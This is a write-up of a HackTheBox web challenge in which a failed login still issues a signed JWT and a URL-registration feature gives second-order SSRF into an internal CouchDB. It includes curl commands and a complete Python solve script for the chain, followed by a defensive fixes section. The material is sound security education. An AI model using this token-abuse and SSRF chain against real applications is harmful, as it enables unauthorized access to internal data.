---
title: "CitiSmart"
date: 2027-09-04 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, broken-authentication, jwt, second-order-ssrf, couchdb, cwe-918, cwe-287]
description: "A Next.js smart-city dashboard hands you a valid session token even when your login fails, and a 'register an endpoint' feature turns into second-order SSRF that reads an internal CouchDB. Two small flaws chain into a full internal-DB read."
---

## Overview

`CitiSmart` is an Easy HackTheBox **Web** challenge — a Next.js "smart city monitoring" dashboard. The flag lives in an internal CouchDB the application can reach but you cannot. The path there is a two-step chain: a [broken-authentication](https://cwe.mitre.org/data/definitions/287.html) flaw that mints a valid JWT on a *failed* login, followed by a second-order [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html) ([CWE-918](https://cwe.mitre.org/data/definitions/918.html)) in the dashboard that fetches an attacker-supplied URL.

## The technique

Two independent bugs, chained:

1. **A valid token is issued on a failed login ([CWE-287](https://cwe.mitre.org/data/definitions/287.html)).** The login API returns different errors for unknown users versus wrong passwords (a user-enumeration tell), and — critically — sets a signed JWT cookie *even on the wrong-password 400 response*. The token's own claims say `loggedIn:false, admin:false`, but the dashboard middleware only checks that the signature is valid, never the claims. Possession of any signed token equals authentication.

2. **Second-order SSRF ([CWE-918](https://cwe.mitre.org/data/definitions/918.html)).** One endpoint *stores* an attacker-supplied URL; a separate "metrics" endpoint later *fetches every stored URL server-side* and reflects each response body. Because the fetch sink is decoupled from the input, registering an internal URL and then reading the metrics endpoint exfiltrates the internal response.

## Solution

First, confirm `admin@citismart.htb` exists and grab the token that the failed login still hands out:

```bash
curl -s -i -X POST -H 'Content-Type: application/json' \
  -d '{"email":"admin@citismart.htb","password":"Password123!"}' \
  http://TARGET/api/auth/login | grep -i set-cookie
# 400 "Invalid password" — but Set-Cookie: token=<JWT> is present anyway
```

The dashboard exposes a list/register endpoint and a metrics endpoint. The metrics endpoint
fetches every registered URL server-side, so register the internal CouchDB FLAG document and
read it back:

```bash
# register an internal target — unauthenticated loopback CouchDB; trailing ? eats any appended suffix
curl -s -b 'token=<jwt>' -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:5984/citismart/FLAG?","sector":"a"}' \
  http://TARGET/api/dashboard/endpoints/

# metrics fetches it server-side and reflects the body under data["a"]
curl -s -b 'token=<jwt>' http://TARGET/api/dashboard/metrics/
# data["a"] = {"_id":"FLAG", ... "value":"FLAG=HTB{...}"}
```

The whole chain, as a single runnable script:

Create `solve.py`:

```python
import sys, json, urllib.request, urllib.error, re
base = sys.argv[1].rstrip("/")

def req(path, data=None, cookie=None):
    hdr = {"Content-Type": "application/json"}
    if cookie: hdr["Cookie"] = cookie
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(base + path, data=body, headers=hdr,
                               method="POST" if data is not None else "GET")
    try: return urllib.request.urlopen(r, timeout=20)
    except urllib.error.HTTPError as e: return e   # 400 still carries the cookie

r = req("/api/auth/login", {"email": "admin@citismart.htb", "password": "Password123!"})
token = r.headers["Set-Cookie"].split("token=", 1)[1].split(";", 1)[0]
cookie = "token=" + token

req("/api/dashboard/endpoints/",
    {"url": "http://127.0.0.1:5984/citismart/FLAG?", "sector": "a"}, cookie)

data = json.loads(req("/api/dashboard/metrics/", cookie=cookie).read())["data"]
print(re.search(r"HTB\{[^}]+\}", data["a"]).group(0))
```

```bash
python3 solve.py http://TARGET
# HTB{...}
```

Flag value redacted — the script derives it live.

## Why it worked

The login handler set the session cookie on every code path instead of only after a successful password check, and the API authorization was "claim-blind" — it trusted any signature-valid token without ever reading the `loggedIn`/`admin` claims it contained. Separately, the dashboard accepted a client-supplied full URL, stored it, and fetched it server-side in a different handler with no validation at either step. Internal CouchDB on `127.0.0.1:5984` trusts loopback connections with no authentication, so a single SSRF read dumped the FLAG document.

## Fix / defense

- Issue a session/JWT only **after** authentication succeeds — never on the failure path — and make middleware verify the authorization claims, not just the signature.
- Return one uniform error for unknown-user and wrong-password to kill enumeration.
- Don't accept a client-supplied full URL for a server-side fetch: build the URL server-side from an opaque id, or enforce a scheme+host+port allowlist at **both** registration and fetch time, denying loopback/private ranges.
- Require authentication on internal services — never assume "only the server can reach it."
